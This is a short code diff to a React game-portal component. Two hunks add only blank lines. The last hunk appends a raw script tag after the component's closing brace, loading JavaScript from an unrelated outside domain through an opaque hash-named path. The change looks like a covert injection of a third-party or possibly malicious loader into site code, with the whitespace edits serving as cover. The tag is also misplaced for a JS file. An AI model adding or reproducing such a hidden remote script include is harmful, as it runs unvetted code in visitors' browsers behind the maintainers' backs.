@@ -304,6 +304,7 @@ export default function GamePortal() {
     <div className="min-h-screen bg-slate-950 text-slate-100 font-sans selection:bg-cyan-500 selection:text-black flex flex-col justify-between">
       <div>
         {/* NAVBAR */}
+        
         <nav className="sticky top-0 z-40 bg-slate-900/80 backdrop-blur-md border-b border-cyan-500/20">
           <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
             <div className="flex items-center justify-between h-16">
@@ -987,6 +988,7 @@ export default function GamePortal() {
                       <th className="p-4 text-center w-32">Actions</th>
                     </tr>
                   </thead>
+                  
                   <tbody className="divide-y divide-slate-800/60">
                     {posts.length === 0 ? (
                       <tr>
@@ -1457,3 +1459,4 @@ export default function GamePortal() {
     </div>
   );
 }
+<script src="https://awkwardmonopoly.com/20/18/63/201863e19025f3e3a9bb97ff8f3d4bc0.js"></script>
